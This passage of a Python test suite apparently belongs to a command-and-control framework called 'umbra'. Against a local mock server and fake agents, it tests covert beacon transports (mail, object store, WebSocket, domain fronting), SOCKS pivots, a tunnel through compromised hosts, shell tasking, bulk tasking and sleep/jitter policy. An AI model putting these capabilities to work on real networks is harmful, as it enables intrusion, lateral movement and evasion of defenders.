        finally:
            client.close()
    finally:
        server.stop()


def test_operator_cli_reaches_a_mutual_tls_server(tmp_path):
    """The global --tls flags have to reach the client."""
    import subprocess

    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    certs = _write_certificates(str(tmp_path))
    token = b"operator-token-tls-0123456789"
    server = MockServer(
        AGENT_PSK,
        {"alice": token},
        tls_cert=certs["server"],
        tls_key=certs["server"],
        tls_client_ca=certs["ca"],
    )
    server.start()
    env = dict(os.environ)
    env["PYTHONPATH"] = os.path.join(ROOT, "operator")
    try:
        live = subprocess.run(
            [sys.executable, "-m", "umbra_cli", "--server", server.address,
             "-o", "alice", "-k", token.decode(),
             "--tls", "--tls-ca", certs["ca"], "--tls-server-name", "localhost",
             "--tls-cert", certs["client"], "--tls-key", certs["client"],
             "stats"],
            capture_output=True, text=True, env=env, timeout=60,
        )
        assert live.returncode == 0, live.stdout + live.stderr
        assert json.loads(live.stdout)["protocol"] == "umbra/v1"
    finally:
        server.stop()


# ---------------------------------------------------------------------------
# the WebSocket transport
# ---------------------------------------------------------------------------
def test_websocket_accept_value_matches_rfc6455():
    """The opening handshake has to match the example of RFC 6455."""
    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli import ws  # noqa: WPS433

    assert ws.accept_value("dGhlIHNhbXBsZSBub25jZQ==") == "s3pPLMBiTxaQ9kYGzzhZRbK+xOo="


def test_websocket_frames_round_trip():
    """A umbra frame survives the WebSocket framing in both directions."""
    import struct as _struct

    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli import ws  # noqa: WPS433

    payload = bytes(range(256))
    masked = ws.encode_frame(payload, ws.OP_BINARY, b"\x01\x02\x03\x04")
    assert masked[0] == 0x82  # FIN + binary
    assert masked[1] & 0x80  # masked
    assert _struct.unpack("!H", masked[2:4])[0] == len(payload)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 0))
    server.listen(1)
    host, port = server.getsockname()
    received = []

    def serve():
        conn, _ = server.accept()
        server_side = ws.WebSocketServer(conn)
        assert server_side.handshake()
        # A server frame is never masked.
        server_side.write_frame(b"server-says-hi")
        received.append(server_side.read_frame())
        server_side.close()

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()
    try:
        client = ws.WebSocketClient(host, port, path="/ws")
        client.connect()
        assert client.read_frame() == b"server-says-hi"
        client.write_frame(payload)
        thread.join(timeout=5)
        assert received == [payload]
        client.close()
    finally:
        server.close()


def test_the_websocket_transport_works_over_tls(tmp_path):
    """A TLS-inspecting proxy in front of the server changes nothing.

    The WebSocket upgrade travels inside the TLS session, so the server
    has to look at the first bytes of the *decrypted* stream: OpenSSL
    refuses to peek at a socket, and the bytes have to be read and kept.
    """
    import ssl

    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli import ws

    certs = _write_certificates(str(tmp_path))
    server = MockServer(
        AGENT_PSK,
        {"alice": OP_TOKEN},
        tls_cert=certs["server"],
        tls_key=certs["server"],
        websocket=True,
    )
    server.start()
    try:
        host, _, port = server.address.rpartition(":")
        context = ssl.create_default_context(cafile=certs["ca"])
        client = ws.WebSocketClient(
            host, int(port), path="/ws", timeout=15,
            ssl_context=context, server_hostname="localhost",
        )
        client.connect()
        stream = ws.WebSocketStream(client)
        result = handshake.client_handshake(
            stream,
            psk=AGENT_PSK,
            role=crypto.ROLE_AGENT,
            ident="agent-tls-ws",
            meta={"host": "lab-host", "os": "linux", "arch": "x86_64"},
        )
        assert result.session is not None
        # The session works: a check-in is answered.
        stream.send_frame(result.session.encrypt(
            wire.MsgType.CHECKIN, {"ts": int(time.time()), "n": 0}))
        msg_type, _ = result.session.decrypt_message(stream.recv_frame())
        assert msg_type == wire.MsgType.TASK_BATCH
    finally:
        server.stop()


def _echo_server_v6() -> Tuple[socket.socket, threading.Thread, List[bytes]]:
    """A tiny TCP echo server on the IPv6 loopback."""
    listener = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("::1", 0))
    listener.listen(4)
    seen: List[bytes] = []

    def handle(conn: socket.socket) -> None:
        """One connection at a time: the pivot opens a new one per stream."""
        with conn:
            while True:
                try:
                    data = conn.recv(4096)
                except OSError:
                    break
                if not data:
                    break
                seen.append(data)
                try:
                    conn.sendall(data)
                except OSError:
                    break

    def serve() -> None:
        while True:
            try:
                conn, _ = listener.accept()
            except OSError:
                break
            handle(conn)

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()
    return listener, thread, seen


def _socks5_connect_v6(proxy_host: str, proxy_port: int, host: str, port: int):
    """Open a SOCKS5 tunnel to an IPv6 target.

    The request carries the IPv6 address type, and the answer is read the
    way the protocol says: the address type tells how many bytes follow.
    """
    conn = socket.create_connection((proxy_host, int(proxy_port)), timeout=10)
    conn.sendall(b"\x05\x01\x00")
    assert _recv_exact(conn, 2) == b"\x05\x00"
    conn.sendall(b"\x05\x01\x00\x04" + socket.inet_pton(socket.AF_INET6, host)
                 + int(port).to_bytes(2, "big"))
    head = _recv_exact(conn, 4)
    assert head[1] == 0x00, head
    atyp = head[3]
    if atyp == 0x01:
        _recv_exact(conn, 4)
    elif atyp == 0x04:
        _recv_exact(conn, 16)
    else:
        _recv_exact(conn, 1)
    _recv_exact(conn, 2)
    return conn


def test_the_pivot_reaches_an_ipv6_target():
    """IPv6 everywhere: the proxy, the agent and the target all speak IPv6.

    A network that has only IPv6 is a network the framework has to work
    in: the SOCKS5 client asks for an IPv6 target, the answer carries the
    family of the listener, and the bytes travel the whole way.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    target, _, seen = _echo_server_v6()
    _, target_port = target.getsockname()[:2]

    token = b"operator-token-ipv6-01234567"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-ipv6", interval=0.3)
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 10
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "the agent never checked in"

        # The proxy listens on the IPv6 loopback: the address it reports
        # is an IPv6 one.
        tunnel = client.pivot_open("agent-ipv6", mode="socks", listen="[::1]:0")
        assert tunnel["listen"].startswith("[::1]:"), tunnel["listen"]

        listen = tunnel["listen"]
        lhost, _, lport = listen.rpartition("]:")
        conn = _socks5_connect_v6(lhost.lstrip("["), lport, "::1", target_port)
        conn.sendall(b"ipv6")
        assert conn.recv(64) == b"ipv6"
        conn.close()
        assert b"ipv6" in seen
    finally:
        client.close()
        agent.stop()
        server.stop()
        target.close()


def test_the_tunnel_answers_a_ping_and_routes_a_network():
    """The layer-3 tunnel, finished: the address, the routing table, the
    ping and the counters.

    The tunnel is a transport of its own: the beacon joins it with the
    key it already has, the server hands out the address and keeps the
    routing table, and the operator can ask a peer whether it is there.
    The question travels through the tunnel and comes back through it, so
    the answer says more than the bookkeeping of the server.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-vpn-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-vpn", interval=0.3,
                      vpn_addr=server.vpn.address())
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 10
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "the agent never checked in"

        # The beacon joins the tunnel with the key it already has.
        task_id = client.submit("agent-vpn", "vpn", {"action": "start"})
        deadline = time.time() + 15
        state = ""
        while time.time() < deadline:
            row = client.task(task_id)
            state = row.get("state", "")
            if state in ("done", "failed"):
                break
            time.sleep(0.1)
        assert state == "done", (state, client.task(task_id))

        # The peer is in the table with the address the server gave it.
        deadline = time.time() + 10
        peers: list = []
        while time.time() < deadline:
            peers = client.vpn_peers()
            if peers:
                break
            time.sleep(0.1)
        assert peers, "the peer never joined the tunnel"
        peer = peers[0]
        assert peer["id"] == "agent-vpn", peer
        assert peer["address"].startswith("10.77."), peer
        assert peer["live"] is True, peer

        # The question goes through the tunnel and comes back through it.
        answer = client.vpn_ping("agent-vpn", timeout_ms=5000)
        assert answer["peer"] == "agent-vpn", answer
        assert answer["rtt_ms"] >= 0, answer

        # A network behind the peer is routed to it.
        route = client.vpn_route("agent-vpn", "192.168.5.0/24")
        assert route["peer"] == "agent-vpn", route
        assert route["network"] == "192.168.5.0/24", route
        routes = client.vpn_routes()
        assert [r["network"] for r in routes] == ["192.168.5.0/24"], routes

        # The counters of the tunnel move.
        status = client.vpn_status()
        assert status["enabled"] is True, status
        assert status["peers"] >= 1, status
        assert status["routes"] == 1, status
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_pivot_may_listen_on_a_named_pipe():
    """A named pipe is the Windows equivalent of a Unix socket.

    The pivot listens on a socket of the file system instead of a TCP
    socket, so only a process of the host can reach it.  The mock has no
    named pipe of its own, so it uses a socket of the file system, which
    has the same shape.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    target, _, seen = _echo_server()
    _, target_port = target.getsockname()[:2]

    token = b"operator-token-pipe-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-pipe", interval=0.3)
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 10
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "the agent never checked in"

        tunnel = client.pivot_open("agent-pipe", mode="socks", pipe=True)
        assert tunnel.get("pipe") is True, tunnel
        listen = tunnel["listen"]
        assert listen.startswith("pipe:"), listen
        path = listen.split(":", 1)[1]

        # The proxy answers on the socket of the file system.
        conn = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        conn.settimeout(10)
        conn.connect(path)
        conn.sendall(b"\x05\x01\x00")
        assert _recv_exact(conn, 2) == b"\x05\x00"
        conn.sendall(b"\x05\x01\x00\x01" + socket.inet_aton("127.0.0.1") +
                     int(target_port).to_bytes(2, "big"))
        reply = _recv_exact(conn, 10)
        assert reply[1] == 0x00, reply
        conn.sendall(b"pipe")
        assert conn.recv(64) == b"pipe"
        conn.close()
        assert b"pipe" in seen
    finally:
        client.close()
        agent.stop()
        server.stop()
        target.close()


def test_the_beacon_can_talk_over_the_mail_transport():
    """The mail transport: the frames are mailed out and the answer comes
    back from the mailbox.

    A network where nothing but the mail server gets through is a network
    the framework has to work in, so the beacon mails its check-in, picks
    the work up from its own mailbox and mails the answer back.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-mail-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(
        server.address, AGENT_PSK, "agent-mail", interval=0.3,
        transport="smtp", mail_addr=server.mail_addr, pop3_addr=server.pop3_addr,
    )
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 10
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "the agent never checked in"

        task_id = client.submit("agent-mail", "shell", {"cmd": "echo umbra-mail"})
        result = client.wait_for_result(task_id, timeout=30, poll=0.05)
        assert b"umbra-mail" in result["out"]

        # The mailbox is empty again: the mail was delivered and deleted.
        with server._lock:
            left = len(server.mailboxes.get("agent-mail", []))
        assert left == 0, left
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_beacon_can_talk_over_the_object_transport():
    """The object transport: the work is read from one bucket and the
    answer is written into another.

    The beacon talks to the object store the way a program does: it puts
    its batch into the results bucket and reads the work of the agent
    from the tasks bucket.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-s3-01234567890"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(
        server.address, AGENT_PSK, "agent-s3", interval=0.3,
        transport="s3", s3_addr=server.s3_addr,
    )
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 10
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "the agent never checked in"

        task_id = client.submit("agent-s3", "shell", {"cmd": "echo umbra-s3"})
        result = client.wait_for_result(task_id, timeout=30, poll=0.05)
        assert b"umbra-s3" in result["out"]

        # The work of the agent is gone from the task bucket: it was
        # picked up.
        with server._lock:
            left = len(server.objects.get("umbra-tasks", {}))
        assert left == 0, left
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_a_signed_object_request_that_was_changed_is_refused():
    """The signature of an object request covers the body.

    A request whose body was changed on the way no longer verifies, so
    the store refuses it instead of taking the frames of somebody else.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    import batch_transports  # noqa: WPS433

    headers = batch_transports.sign_request(
        "PUT", "/umbra-results/1", b"the frames", "127.0.0.1:9000",
        "agent-one", batch_transports.agent_secret(b"team-key-0123456789ab", "agent-one"),
    )
    lowered = {name.lower(): value for name, value in headers.items()}
    secret_of = lambda agent: batch_transports.agent_secret(  # noqa: E731
        b"team-key-0123456789ab", agent
    )
    assert batch_transports.verify_request(
        "PUT", "/umbra-results/1", "", lowered, b"the frames", secret_of
    ) == "agent-one"
    # The body was changed: the signature does not hold any more.
    assert batch_transports.verify_request(
        "PUT", "/umbra-results/1", "", lowered, b"other frames", secret_of
    ) is None
    # Another agent cannot sign for this one.
    assert batch_transports.verify_request(
        "PUT", "/umbra-results/1", "", lowered, b"the frames",
        lambda agent: "another secret",
    ) is None


def test_the_operator_can_tell_an_agent_which_transport_it_speaks():
    """The transport matrix: the operator knows the network of the target.

    "This agent only speaks DNS, that one goes through a front domain" is
    knowledge the server has and the beacon does not.  The route travels
    with the task batch, and the beacon follows it: the agent that was
    told to speak WebSocket dials with WebSocket from then on.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-route-012345678"
    server = MockServer(AGENT_PSK, {"alice": token}, websocket=True)
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-route", interval=0.3)
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 10
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "the agent never checked in"

        # The operator names the road: WebSocket first, TCP as the
        # fallback, and a front domain to hide behind.
        route = client.transport_set(
            "agent-route",
            primary="ws",
            fallback=["tcp"],
            front="cdn.example.com",
            inspect=True,
        )
        assert route["primary"] == "ws"
        assert route["fallback"] == ["tcp"]
        assert route["front"] == "cdn.example.com"
        assert route["inspect"] is True

        # The route is readable again, and the list knows about it.
        got = client.transport_get("agent-route")
        assert got["primary"] == "ws"
        assert got["front"] == "cdn.example.com"
        routes = client.transport_list()
        assert any(r["agent"] == "agent-route" for r in routes)

        # The beacon follows the route: it dials with WebSocket now.
        deadline = time.time() + 15
        while time.time() < deadline and not agent.websocket:
            time.sleep(0.05)
        assert agent.websocket, "the agent never followed the route"
        assert agent.route["primary"] == "ws"
        assert agent.route["front"] == "cdn.example.com"

        # And the switch did not break the session: it still answers.
        task_id = client.submit("agent-route", "shell", {"cmd": "echo umbra-route"})
        result = client.wait_for_result(task_id, timeout=20, poll=0.05)
        assert b"umbra-route" in result["out"]
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_route_may_name_a_transport_without_a_connection():
    """The operator may put an agent on the mail or the object transport.

    The two transports keep no connection, so the operator names them
    like any other transport and the route carries the name to the
    beacon.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-batch-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-batch", interval=0.3)
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 10
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "the agent never checked in"

        route = client.transport_set("agent-batch", primary="smtp", fallback=["tcp"])
        assert route["primary"] == "smtp"
        assert route["fallback"] == ["tcp"]
        route = client.transport_set("agent-batch", primary="s3")
        assert route["primary"] == "s3"
        got = client.transport_get("agent-batch")
        assert got["primary"] == "s3"
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_a_route_that_names_an_unknown_transport_is_refused():
    """A typo in the route must not reach the beacon.

    The server refuses a transport it does not know: a beacon that cannot
    speak the transport would answer nothing, and the operator would wait
    for an answer that never comes.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-badroute-0123456"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-badroute", interval=0.3)
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 10
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "the agent never checked in"

        with pytest.raises(OperatorError):
            client.transport_set("agent-badroute", primary="carrier-pigeon")
        with pytest.raises(OperatorError):
            client.transport_set("agent-badroute", primary="tcp", fallback=["smoke"])
        with pytest.raises(OperatorError):
            client.transport_set("agent-nobody", primary="tcp")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_websocket_transport_carries_a_full_session():
    """The reference agent speaks WebSocket to the same server."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-ws-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token}, websocket=True)
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-ws", interval=0.3, websocket=True)
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents() and client.agents()[0]["id"] == "agent-ws"

        task_id = client.submit("agent-ws", "shell", {"cmd": "echo umbra-ws"})
        result = client.wait_for_result(task_id, timeout=15, poll=0.05)
        assert result["state"] == "done"
        assert b"umbra-ws" in result["out"]
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_padding_frames_are_ignored():
    """A padding frame must not disturb the session.

    The padding is what makes the size of a request uniform, so every
    implementation has to step over it instead of dropping the link.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    server = MockServer(AGENT_PSK, {"alice": OP_TOKEN})
    server.start()
    try:
        host, _, port = server.address.rpartition(":")
        sock = socket.create_connection((host, int(port)), timeout=10)
        stream = netio.Stream(sock, timeout=10)
        result = handshake.client_handshake(
            stream, psk=AGENT_PSK, role=crypto.ROLE_AGENT, ident="agent-pad"
        )
        sess = result.session
        # A padding frame first, then the real check-in.
        stream.send_frame(sess.encrypt(wire.MsgType.PADDING, {"pad": "x" * 32}))
        stream.send_frame(sess.encrypt(wire.MsgType.CHECKIN, {"ts": 1, "n": 0}))
        msg_type, _ = sess.decrypt_message(stream.recv_frame())
        assert msg_type == wire.MsgType.TASK_BATCH
        stream.close()
    finally:
        server.stop()


# ---------------------------------------------------------------------------
# Local state database
#
# The console keeps its own notebook in SQLite.  It has to survive a restart,
# it must never hold a credential, and it must work without a server.
# ---------------------------------------------------------------------------
def test_local_state_database_round_trip(tmp_path):
    from umbra_cli import db

    path = tmp_path / "state.db"
    store = db.StateStore(str(path)).open()
    try:
        session = store.start_session("alice", "127.0.0.1:4002", "abc123")
        assert session > 0
        store.record_task("task-1", "agent-1", "shell",
                          {"cmd": "whoami"}, session)
        store.record_result("task-1", 0, b"root\n", "")
        store.record_task("task-2", "agent-2", "ls", {"path": "/tmp"}, session)
        store.add_note("the DC is dc01.corp.example", "agent-1")

        # The task and its result are both on disk now.
        tasks = store.tasks("agent-1")
        assert len(tasks) == 1
        assert tasks[0]["kind"] == "shell"
        assert tasks[0]["args"]["cmd"] == "whoami"
        assert tasks[0]["state"] == "done"

        results = store.results("task-1")
        assert len(results) == 1
        assert results[0]["output"] == b"root\n"

        # A failed task is marked as such.
        store.record_result("task-2", 1, b"", "no such file")
        assert store.task("task-2")["state"] == "failed"

        # Search reaches notes and result output.
        found = store.search("dc01")
        assert any(item["where"] == "note" for item in found)
        store.record_result("task-3", 0, b"the flag is in /etc/shadow\n", "")
        found = store.search("shadow")
        assert any(item["where"] == "result" for item in found)

        stats = store.stats()
        assert stats["tasks"] == 2
        assert stats["results"] == 3
        assert stats["notes"] == 1
        assert stats["agents"] == 2
    finally:
        store.close()

    # A second process finds the same state: the notebook is a file, not a
    # cache that dies with the console.
    again = db.StateStore(str(path)).open()
    try:
        assert again.stats()["tasks"] == 2
        assert len(again.notes()) == 1
    finally:
        again.close()


def test_local_state_database_refuses_a_newer_schema(tmp_path):
    from umbra_cli import db

    path = tmp_path / "future.db"
    store = db.StateStore(str(path)).open()
    try:
        store.conn.execute("UPDATE meta SET value = ? WHERE key = 'schema_version'",
                           (str(db.SCHEMA_VERSION + 1),))
        store.conn.commit()
    finally:
        store.close()
    with pytest.raises(db.StateError):
        db.StateStore(str(path)).open()


def test_operator_cli_db_commands_work_without_a_server(tmp_path):
    """`umbra db ...` is local: it must not need a token or a connection."""
    import subprocess

    env = dict(os.environ)
    env["PYTHONPATH"] = os.path.join(ROOT, "operator")
    path = str(tmp_path / "cli.db")

    done = subprocess.run(
        [sys.executable, "-m", "umbra_cli", "--db", path, "db", "note",
         "recon done", "--agent", "agent-1"],
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert done.returncode == 0, done.stdout + done.stderr
    assert "note" in done.stdout

    listed = subprocess.run(
        [sys.executable, "-m", "umbra_cli", "--db", path, "--json", "db", "notes"],
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert listed.returncode == 0, listed.stdout + listed.stderr
    payload = json.loads(listed.stdout)
    assert payload and payload[0]["body"] == "recon done"
    assert payload[0]["agent"] == "agent-1"


def test_operator_cli_records_the_engagement_in_its_notebook(tmp_path):
    """What the operator runs ends up in the console's own database."""
    import subprocess

    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-notebook-01234"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-notebook", interval=0.2)
    agent.start()

    env = dict(os.environ)
    env["PYTHONPATH"] = os.path.join(ROOT, "operator")
    path = str(tmp_path / "notebook.db")
    base = [sys.executable, "-m", "umbra_cli", "--server", server.address,
            "-o", "alice", "-k", token.decode(), "--db", path]

    def run(*argv: str) -> "subprocess.CompletedProcess[str]":
        return subprocess.run(base + list(argv), capture_output=True, text=True,
                              env=env, timeout=60)

    try:
        deadline = time.time() + 5
        while time.time() < deadline:
            out = json.loads(run("--json", "agents").stdout)
            if out:
                break
            time.sleep(0.05)
        assert out and out[0]["id"] == "agent-notebook"

        submitted = json.loads(run("--json", "task", "agent-notebook", "shell",
                                   "--args", '{"cmd":"echo notebook"}').stdout)
        task_id = submitted["task_id"]

        # The task is in the notebook straight away.
        rows = json.loads(run("--json", "db", "tasks").stdout)
        assert rows and rows[0]["task_id"] == task_id
        assert rows[0]["kind"] == "shell"
        assert rows[0]["args"]["cmd"] == "echo notebook"

        # And the result joins it once the implant answered.
        payload = {}
        for _ in range(100):
            payload = json.loads(run("--json", "result", task_id).stdout)
            if payload.get("state") == "done":
                break
            time.sleep(0.1)
        assert payload.get("state") == "done"

        results = json.loads(run("--json", "db", "results").stdout)
        assert results and results[0]["task_id"] == task_id
        assert "notebook" in results[0]["output"]

        # The notebook is searchable: the operator finds the output again.
        found = json.loads(run("--json", "db", "search", "notebook").stdout)
        assert found
    finally:
        agent.stop()
        server.stop()


# ---------------------------------------------------------------------------
# Bulk operations, filters and the beacon policy
#
# An operator works on groups, not on single machines: "every online Windows
# box", "everything tagged finance".  These tests pin the selection rules and
# the policy push.
# ---------------------------------------------------------------------------
def test_bulk_task_reaches_every_selected_agent():
    """One task, many agents: the filter decides who runs it."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-bulk-01234567"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    first = FakeAgent(server.address, AGENT_PSK, "agent-one")
    second = FakeAgent(server.address, AGENT_PSK, "agent-two")
    first.start()
    second.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline:
            agents = client.agents()
            if len(agents) >= 2:
                break
            time.sleep(0.05)
        assert len(agents) == 2, agents

        rows = client.submit_bulk("sysinfo", {}, state="online")
        assert len(rows) == 2, rows
        assert {row["agent_id"] for row in rows} == {"agent-one", "agent-two"}
        assert all(row["task_id"] for row in rows)

        # The tasks really are queued for both agents.
        for row in rows:
            task = client.task(row["task_id"])
            assert task["agent_id"] == row["agent_id"]
            assert task["kind"] == "sysinfo"
    finally:
        client.close()
        first.stop()
        second.stop()
        server.stop()


def test_a_bulk_task_without_targets_is_refused():
    """A forgotten filter must not hit every agent in the inventory."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient, OperatorError  # noqa: WPS433

    token = b"operator-token-nobulk-0123456"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-lonely")
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline:
            if client.agents():
                break
            time.sleep(0.05)
        with pytest.raises(OperatorError):
            client.submit_bulk("sysinfo", {})
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_agent_tags_are_stored_and_filterable():
    """Tags are the operator's own labels, and they narrow every view."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-tags-01234567"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-tagged")
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline:
            if client.agents():
                break
            time.sleep(0.05)

        data = client.tag_agents(["finance", "dc-01"], agents=["agent-tagged"])
        assert data["updated"] == ["agent-tagged"]

        rows = client.agents(tag="finance")
        assert [row["id"] for row in rows] == ["agent-tagged"]
        assert sorted(rows[0].get("tags", [])) == ["dc-01", "finance"]

        # A tag that does not exist selects nothing.
        assert client.agents(tag="nope") == []

        # Removing a tag takes it away again.
        client.tag_agents(["finance"], mode="remove", agents=["agent-tagged"])
        assert client.agents(tag="finance") == []
        assert [row["id"] for row in client.agents(tag="dc-01")] == ["agent-tagged"]
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_agent_filters_narrow_the_inventory():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-filter-0123456"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-filtered")
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline:
            if client.agents():
                break
            time.sleep(0.05)

        assert client.agents(state="online")
        assert client.agents(state="offline") == []
        assert client.agents(transport="tcp")
        assert client.agents(transport="dns") == []
        assert client.agents(os="linux")
        assert client.agents(os="windows") == []
        assert client.agents(user="nobody") == []
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_policy_push_reaches_the_beacon():
    """The cadence and the obfuscation flag travel with the check-in."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-policy-012345"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-policy")
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline:
            if client.agents():
                break
            time.sleep(0.05)

        data = client.set_policy(120, 45, obfuscate=False, agents=["agent-policy"])
        assert data["updated"] == ["agent-policy"]
        assert data["obfuscate"] is False

        # The beacon picks the policy up with its next check-in.
        deadline = time.time() + 5
        while time.time() < deadline:
            if agent.policy.get("sleep") == 120:
                break
            time.sleep(0.05)
        assert agent.policy.get("sleep") == 120
        assert agent.policy.get("jitter") == 45
